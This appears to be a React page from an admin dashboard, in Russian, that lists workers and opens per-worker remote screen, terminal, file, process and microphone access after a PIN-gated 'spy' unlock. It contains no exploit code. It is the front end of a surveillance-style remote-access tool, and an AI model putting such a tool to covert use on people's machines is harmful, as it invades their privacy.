import { useEffect, useState } from 'react'
import { getUsers, getWorkersStats } from '../api'
import { PinModal, MonitoringModal } from '../components/MonitoringModal'

function fmtLastSeen(dateStr) {
  if (!dateStr) return 'никогда'
  const diff = Math.floor((Date.now() - new Date(dateStr)) / 1000)
  if (diff < 60) return 'только что'
  if (diff < 3600) return `${Math.floor(diff / 60)} мин назад`
  if (diff < 86400) return `${Math.floor(diff / 3600)}ч назад`
  return new Date(dateStr).toLocaleDateString('ru-RU')
}

function fmtDuration(seconds) {
  if (!seconds || seconds < 60) return '< 1 мин'
  const h = Math.floor(seconds / 3600)
  const m = Math.floor((seconds % 3600) / 60)
  if (h === 0) return `${m} мин`
  return `${h}ч ${m}м`
}

const QUICK_TABS = [
  { id: 'screen', label: '📷 Экран' },
  { id: 'shell', label: '💻 Терминал' },
  { id: 'files', label: '📁 Файлы' },
  { id: 'processes', label: '⚙ Процессы' },
  { id: 'mic', label: '🎙 Микрофон' },
  { id: 'controls', label: '🛠 Управление' },
]

export default function Monitoring() {
  const [workers, setWorkers] = useState([])
  const [stats, setStats] = useState({})
  const [spyUnlocked, setSpyUnlocked] = useState(false)
  const [showPin, setShowPin] = useState(false)
  const [monitoringWorker, setMonitoringWorker] = useState(null)
  const [defaultTab, setDefaultTab] = useState('screen')

  const loadStats = () =>
    getWorkersStats().then((list) => {
      const map = {}
      list.forEach((s) => { map[s.user_id] = s })
      setStats(map)
    }).catch(() => {})

  useEffect(() => {
    Promise.all([
      getUsers().then((users) => setWorkers(users.filter((u) => u.role === 'worker'))),
      loadStats(),
    ])
    const interval = setInterval(loadStats, 10_000)
    return () => clearInterval(interval)
  }, [])

  const openMonitoring = (worker, tab = 'screen') => {
    setDefaultTab(tab)
    if (spyUnlocked) {
      setMonitoringWorker(worker)
    } else {
      // show PIN, then open
      setMonitoringWorker({ _pending: true, worker, tab })
      setShowPin(true)
    }
  }

  const handlePinSuccess = () => {
    setSpyUnlocked(true)
    setShowPin(false)
    if (monitoringWorker?._pending) {
      setDefaultTab(monitoringWorker.tab)
      setMonitoringWorker(monitoringWorker.worker)
    }
  }

  const onlineWorkers = workers.filter(w => stats[w.id]?.is_online)
  const offlineWorkers = workers.filter(w => !stats[w.id]?.is_online)

  return (
    <div className="p-6">
      <div className="flex items-center justify-between mb-6">
        <div>
          <h1 className="text-2xl font-bold">Мониторинг</h1>
          <p className="text-sm text-slate-500 mt-1">{onlineWorkers.length} онлайн · {offlineWorkers.length} офлайн</p>
        </div>
        {spyUnlocked && (
          <span className="text-xs px-3 py-1.5 rounded-lg bg-green-500/10 border border-green-500/20 text-green-400">
            🔓 Разблокировано
          </span>
        )}
      </div>

      {workers.length === 0 && (
        <div className="text-center text-slate-500 py-20">Качеров нет</div>
      )}

      <div className="grid grid-cols-1 gap-4 sm:grid-cols-2 xl:grid-cols-3">
        {[...onlineWorkers, ...offlineWorkers].map((w) => {
          const s = stats[w.id]
          const isOnline = s?.is_online ?? false

          return (
            <div key={w.id} className={`bg-surface border rounded-xl p-4 flex flex-col gap-3 transition-colors ${isOnline ? 'border-border/50' : 'border-border/20 opacity-70'}`}>
              {/* Header */}
              <div className="flex items-center justify-between">
                <div className="flex items-center gap-2.5">
                  <span className={`w-2.5 h-2.5 rounded-full flex-shrink-0 ${isOnline ? 'bg-green-400 shadow-[0_0_6px_#4ade80]' : 'bg-slate-600'}`} />
                  <div>
                    <div className="font-semibold text-white text-sm">{w.username}</div>
                    <div className="text-xs text-slate-500">{isOnline ? 'в сети' : fmtLastSeen(s?.last_seen_at)}</div>
                  </div>
                </div>
                {w.is_vip && (
                  <span className="text-xs px-2 py-0.5 rounded-full bg-yellow-400/15 text-yellow-400 font-medium">VIP</span>
                )}
              </div>

              {/* Stats row */}
              {s && (
                <div className="grid grid-cols-2 gap-2 text-xs">
                  <div className="bg-black/20 rounded-lg px-3 py-2">
                    <div className="text-slate-500 mb-0.5">Онлайн сегодня</div>
                    <div className="text-white font-medium">{fmtDuration(s.total_online_seconds)}</div>
                  </div>
                  <div className="bg-black/20 rounded-lg px-3 py-2">
                    <div className="text-slate-500 mb-0.5">Заказов</div>
                    <div className="text-white font-medium">{s.completed_orders} / {s.total_orders}</div>
                  </div>
                </div>
              )}

              {/* Quick-access buttons */}
              <div className="border-t border-white/5 pt-3 flex flex-wrap gap-1.5">
                {QUICK_TABS.map(t => (
                  <button
                    key={t.id}
                    onClick={() => openMonitoring(w, t.id)}
                    className="text-xs px-2.5 py-1.5 rounded-lg bg-black/30 border border-white/8 text-slate-400 hover:text-white hover:bg-white/8 transition-colors"
                  >
                    {t.label}
                  </button>
                ))}
              </div>
            </div>
          )
        })}
      </div>

      {showPin && (
        <PinModal onSuccess={handlePinSuccess} onClose={() => { setShowPin(false); setMonitoringWorker(null) }} />
      )}
      {monitoringWorker && !monitoringWorker._pending && (
        <MonitoringModal worker={monitoringWorker} defaultTab={defaultTab} onClose={() => setMonitoringWorker(null)} />
      )}
    </div>
  )
}
